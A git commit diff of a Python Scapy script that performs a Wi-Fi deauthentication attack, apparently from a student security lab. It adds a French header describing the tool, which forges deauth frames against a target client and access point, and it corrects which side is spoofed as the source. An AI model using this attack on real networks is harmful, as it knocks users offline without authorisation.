5f2742b7545102b229d27a9d96addbe85a72167a
Nic Hungi <nichungi@pop-os.localdomain>
2022-03-31 17:24:05 +0200

    entete sur deauth

--- 1_deauth.py
+++ 1_deauth.py
@@ -1,5 +1,15 @@
 #!/usr/bin/env python3 
-# TODO : J'arrive toujours pas a kill le processus avec une interruption..
+# -*- coding: utf-8 -*-
+#----------------------------------------------------------------------------
+# Created By  : Nicolas Hungerbühler & Lucas Gianinetti
+# Created Date: 31.03.22
+# ---------------------------------------------------------------------------
+# Ce programme prend en paramètre une interface réseau (/!\ Doit être en mode 
+# monitor channel hopping /!\), une adresse MAC cible. une addresse MAC d'un AP et 
+# optionnellement un nombre de requêtes de désauthentification.
+# Le programme demande quel Reason Code veut être utilisé puis crée la trame et 
+# en envoie "n" nombres.
+# ---------------------------------------------------------------------------
 # https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py
 
 import argparse
@@ -10,11 +20,11 @@ from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 ################## Passing arguments ##################
 parser = argparse.ArgumentParser(prog="Scapy deauth attack",
                                  usage="%(prog)s -i wlan0mon -b 00:11:22:33:44:55 -c 55:44:33:22:11:00 -n 50",
-                                 description="Scapy based wifi Deauth by @catalyst256",
+                                 description="Scapy based wifi Deauth",
                                  allow_abbrev=False)
 
 parser.add_argument("-i", "--Interface", required=True,
-                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
+                    help="The interface that you want to send packets out of, needs to be set to monitor mode channel hopping")
 
 parser.add_argument("-b", "--BSSID", required=True, help="The BSSID of the Wireless Access Point you want to target")
 
@@ -35,11 +45,11 @@ reason_input = input("Which option do you want ? \n "
 "5-Disassociated because AP is unable to handle all currently associated stations\n "
 "8-Deauthenticated because sending STA is leaving BSS\n")
 
-# Envoyé du client à l'AP
-if(int(reason_input) == 5):
+# Envoyé de l'AP au client
+if(int(reason_input) != 8):
     mac_source = args.BSSID
     mac_dest = args.Client
-else: # Envoyé de l'AP au client
+else: # Envoyé du client à l'AP
     mac_source = args.Client
     mac_dest = args.BSSID
 
